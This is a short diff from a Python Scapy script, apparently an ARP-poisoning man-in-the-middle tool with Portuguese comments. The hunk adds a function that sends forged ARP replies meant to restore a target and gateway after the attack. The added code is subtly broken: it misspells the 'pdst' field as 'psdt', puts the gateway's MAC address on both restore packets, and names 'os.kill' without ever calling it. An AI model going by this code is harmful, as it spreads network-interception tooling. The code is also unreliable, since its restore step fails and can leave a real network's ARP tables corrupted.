@@ -20,6 +20,17 @@ conf.verb = 0
 
 print("[*] Setting up %s" % interface)
 
+
+def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
+    
+    #um metodo um pouco diferente usando send
+    print("[*] Restoring target...")
+    send(ARP(op=2,psrc=gateway_ip,psdt=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+    send(ARP(op=2,psrc=target_ip,psdt=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
+
+    #avisa a thread principal para terminar 
+    os.kill
+
 gateway_mac = get_mac(gateway_ip)
 
 if gateway_mac is None:
